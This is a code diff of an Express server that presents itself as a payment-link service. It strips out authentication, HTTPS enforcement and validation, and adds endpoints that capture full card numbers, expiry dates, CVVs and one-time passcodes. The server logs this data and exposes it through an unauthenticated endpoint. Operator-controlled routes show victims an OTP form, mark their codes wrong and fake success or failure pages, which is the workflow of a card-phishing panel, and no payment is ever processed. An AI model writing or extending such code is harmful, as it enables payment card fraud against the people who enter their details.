@@ -2,137 +2,155 @@ import express from 'express';
 import bodyParser from 'body-parser';
 import cors from 'cors';
 import crypto from 'crypto';
-import http from 'http';
-import { Server as SocketIOServer } from 'socket.io';
-import dotenv from 'dotenv';
-import lowdb from 'lowdb';
-import lowdbNode from 'lowdb/node';
-
-// Load environment variables
-dotenv.config();
-
-// Initialize database
-const adapter = new JSONFile('db.json');
-const db = new Low(adapter);
-await db.read();
-db.data ||= { 
-  transactions: [], 
-  paymentLinks: [], 
-  users: [], 
-  settings: {}
-};
 
 const app = express();
-
-// CORS configuration
-app.use(cors({
-  origin: ['https://www.khatapay.me', 'http://localhost:3000'],
-  credentials: true
-}));
-
 app.use(bodyParser.json());
-app.use(express.static('public'));
+app.use(cors());
+app.use(express.static("."));
 
-// Force HTTPS
-app.use((req, res, next) => {
-  const proto = req.headers['x-forwarded-proto'];
-  if (proto && proto === 'http') {
-    return res.redirect(301, `https://${req.headers.host}${req.url}`);
-  }
-  next();
+const transactions = new Map();
+const paymentLinks = new Map();
+
+// Generate payment link endpoint (links to landing.html)
+app.post('/api/generatePaymentLink', (req, res) => {
+  const { amount, description } = req.body;
+  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
+  // Link directs to landing.html with pid query parameter
+  const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
+  paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
+  res.json({ status: "success", paymentLink });
 });
 
-const server = http.createServer(app);
-const io = new SocketIOServer(server, {
-  cors: {
-    origin: ['https://www.khatapay.me', 'http://localhost:3000'],
-    methods: ['GET', 'POST']
+// Fetch payment details using pid (for landing & payment pages)
+app.get('/api/getPaymentDetails', (req, res) => {
+  const { pid } = req.query;
+  if (!pid || !paymentLinks.has(pid)) {
+    return res.status(404).json({ status: "error", message: "Payment details not found" });
   }
+  const payment = paymentLinks.get(pid);
+  res.json({ status: "success", payment });
 });
 
-// Admin authentication middleware
-app.use('/api/admin/*', (req, res, next) => {
-  const token = req.headers.authorization?.split(' ')[1];
-  if (token !== process.env.ADMIN_TOKEN) {
-    return res.status(401).json({ error: 'Unauthorized' });
+// Get transaction details (for success/fail pages)
+app.get('/api/getTransactionDetails', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction details not found" });
   }
-  next();
+  res.json(txn);
 });
 
-// Generate Payment Link
-app.post('/api/generatePaymentLink', async (req, res) => {
-  try {
-    const { amount, description } = req.body;
-    
-    if (!amount || isNaN(amount)) throw new Error('Invalid amount');
-    if (!description?.trim()) throw new Error('Description required');
-
-    const invoiceId = crypto.randomBytes(16).toString('hex');
-    const paymentLink = `https://${req.get('host')}/landing.html?pid=${invoiceId}`;
-
-    db.data.paymentLinks.push({
-      invoiceId,
-      amount: Number(amount),
-      description,
-      paymentLink,
-      createdAt: new Date().toISOString(),
-      active: true
-    });
-    
-    await db.write();
-
-    res.json({ status: "success", paymentLink });
-    
-  } catch (err) {
-    console.error('Generate Link Error:', err);
-    res.status(400).json({ status: "error", message: err.message });
-  }
+// Get all transactions (for admin panel)
+app.get('/api/transactions', (req, res) => {
+  const txList = Array.from(transactions.values());
+  res.json(txList);
 });
 
-// Landing Page Handler
-app.get('/landing.html', (req, res) => {
-  const pid = req.query.pid;
-  const paymentLink = db.data.paymentLinks.find(link => link.invoiceId === pid);
-  
-  if (!paymentLink) {
-    return res.status(404).send('Invalid payment link');
-  }
-  
-  res.sendFile(process.cwd() + '/public/landing.html');
+// Process payment details
+app.post('/api/sendPaymentDetails', (req, res) => {
+  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
+  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
+  const transaction = {
+    id: invoiceId,
+    cardNumber, // Cleaned on client side
+    expiry,
+    cvv,
+    email,
+    amount: amount.toString().replace(/,/g, ''),
+    currency,
+    cardholder,
+    status: 'processing',
+    otp: null,
+    otpShown: false,
+    otpEntered: null,
+    otpError: false,
+    redirectStatus: null,
+    timestamp: new Date().toLocaleString()
+  };
+  transactions.set(invoiceId, transaction);
+  console.log("New transaction recorded:", transaction);
+  res.json({ status: "success", invoiceId });
 });
 
-// Payment Page Handler
-app.get('/payment.html', (req, res) => {
-  const pid = req.query.pid;
-  const paymentLink = db.data.paymentLinks.find(link => link.invoiceId === pid);
-  
-  if (!paymentLink) {
-    return res.redirect('/404.html');
+// Show OTP for a transaction (admin command)
+app.post('/api/showOTP', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction not found" });
   }
-  
-  res.sendFile(process.cwd() + '/public/payment.html');
+  txn.otpShown = true;
+  txn.status = 'otp_pending';
+  txn.otpError = false;
+  res.json({ status: "success", message: "OTP form will be shown to user" });
 });
 
-// Admin Login
-app.post('/api/admin/login', (req, res) => {
-  const { username, password } = req.body;
-  if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
-    res.json({ 
-      status: "success",
-      token: process.env.ADMIN_TOKEN,
-      user: username
-    });
-  } else {
-    res.status(401).json({ status: "error", message: "Invalid credentials" });
+// Mark OTP as wrong (admin command)
+app.post('/api/wrongOTP', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction not found" });
   }
+  txn.otpError = true;
+  txn.status = 'otp_pending';
+  res.json({ status: "success", message: "OTP marked as wrong" });
 });
 
-// Get Payment Links
-app.get('/api/payment-links', (req, res) => {
-  res.json(db.data.paymentLinks);
+// Check transaction status (polled by payment page)
+app.get('/api/checkTransactionStatus', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction details not found" });
+  }
+  if (txn.status === 'otp_pending' && txn.otpShown) {
+    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
+  }
+  if (txn.redirectStatus) {
+    const redirectUrl = txn.redirectStatus === 'success'
+      ? `/success.html?invoiceId=${invoiceId}`
+      : `/fail.html?invoiceId=${invoiceId}`;
+    return res.json({ status: "redirect", redirectUrl });
+  }
+  res.json({ status: txn.status, otpError: txn.otpError });
+});
+
+// Submit OTP
+app.post('/api/submitOTP', (req, res) => {
+  const { invoiceId, otp } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction not found" });
+  }
+  txn.otpEntered = otp;
+  txn.status = 'otp_received';
+  txn.otpError = false;
+  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
+  res.json({ status: "success", message: "OTP received" });
+});
+
+// Update redirect status (admin command: success/fail)
+app.post('/api/updateRedirectStatus', (req, res) => {
+  const { invoiceId, redirectStatus } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction not found" });
+  }
+  txn.redirectStatus = redirectStatus;
+  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
+  res.json({
+    status: "success",
+    invoiceId,
+    redirectStatus,
+    redirectUrl: redirectStatus === 'success'
+      ? `/success.html?invoiceId=${invoiceId}`
+      : `/fail.html?invoiceId=${invoiceId}`
+  });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
